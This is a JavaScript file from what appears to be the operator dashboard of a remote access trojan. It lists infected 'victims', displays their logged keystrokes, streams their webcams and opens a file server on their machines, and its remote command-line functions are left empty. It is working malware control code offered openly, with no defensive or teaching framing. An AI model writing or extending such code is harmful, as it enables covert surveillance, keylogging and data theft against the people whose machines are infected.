async function getAllVictims() {
    let victims = [];
    await fetch("/get_victims")
        .then(response => {
            if (response.status != 200) 
                throw new Error("Unable to get victims");

            return response.json();
        })
        .then(data => {
            victims = data.map(victim => {          // If the victim's ip address is undefined, set it to "offline"
                if (victim.ipAddress == undefined)
                    victim.ipAddress = "offline";

                return victim;
            }) || [];
        })
        .catch(error => {
            console.error(error);
        });

    console.log("Retrieved victims", victims);

    return victims;
}

function changeSelectedVictim(uuid) {
    // Search for victim and set selected victim
    for(victim of allVictims) {
        if (victim.uuid === uuid) {
            selectedVictim = victim;
            console.log(selectedVictim);
            console.log("Victim found");
            socket.emit("update_selected_victim", { selectedVictimUUID: uuid });
            break;
        }
    }

    document.getElementById("commandPanel").currentVictim = JSON.stringify(selectedVictim);
}

async function updateConnectedVictims(connectedVictims) {
    document.getElementById("victimsList").victims = JSON.stringify(connectedVictims);
    console.log("Updated connected victims: ", connectedVictims);
}

async function updateVideoFrame(frame) {
    console.log(frame);
    let video_feed_ele = document.getElementById("video_feed");
    try {
        video_feed_ele.src = `data:image/jpeg;base64,${frame}`;    
    } catch (error) {
        console.error(error);
    }
}

async function getVictimKeystrokes(uuid) {
    fetch(`/get_victim_keystrokes/${uuid}`)
        .then(response => {
            if (response.status != 200) 
                throw new Error(`Unable to get keystrokes for victim: ${uuid}`);

            return response.json();
        })
        .then(data => {
            const victimKeystrokes = data || [];

            for (let ele of victimKeystrokes)
                updateKeystrokes(ele);
        })
        .catch(error => {
            console.error(error);
        });
}

async function updateKeystrokes(data) {
    console.log(data);
    const commandPanelElement = document.getElementById("commandPanel");

    if ((selectedVictim.uuid == data.uuid) && (commandPanelElement.currentAction == ACTION.KEYSTROKES)) {
        const tableDataDate = document.createElement("td");
        tableDataDate.classList.add("border", "px-8", "py-4");
        tableDataDate.innerHTML = data.added.toString();

        const tableDataKey = document.createElement("td");
        tableDataKey.classList.add("border", "px-8", "py-4");
        tableDataKey.innerHTML = data.keys;

        const tableRow = document.createElement("tr");
        tableRow.appendChild(tableDataDate);
        tableRow.appendChild(tableDataKey);

        document.getElementById("tableBody").appendChild(tableRow);
    }
}

function startFileServer() {
    console.log("Starting file server");
    try {
        socket.emit("file_directory", {
            victimUUID: selectedVictim.uuid,
            task: TASK.START
        });
    } catch(error) {
        console.error("Unable to start file server: ", error);
    }
}

function stopFileServer() {
    console.log("Stopping file server");
    try {
        socket.emit("file_directory", {
            victimUUID: selectedVictim.uuid,
            task: TASK.STOP
        });
    } catch(error) {
        console.error("Unable to stop file server: ", error);
    }
}

function startVideoStream() {
    console.log("Starting video stream");
    try {
        socket.emit("web_camera", { 
            commandId: socket.id,
            victimUUID: selectedVictim.uuid,
            task: TASK.START 
        });
    } catch(error) {
        console.error("Unable to start victim's webcam: ", error);
    }  
}

function stopVideoStream() {
    console.log("Stopping video stream");
    try {
        socket.emit("web_camera", { 
            commandId: socket.id,
            victimUUID: selectedVictim.uuid,
            task: TASK.STOP 
        });
    } catch(error) {
        console.error("Unable to stop victim's webcam: ", error);
    }  
}

function startCommandLine() {

}

function stopCommandLine() {
    
}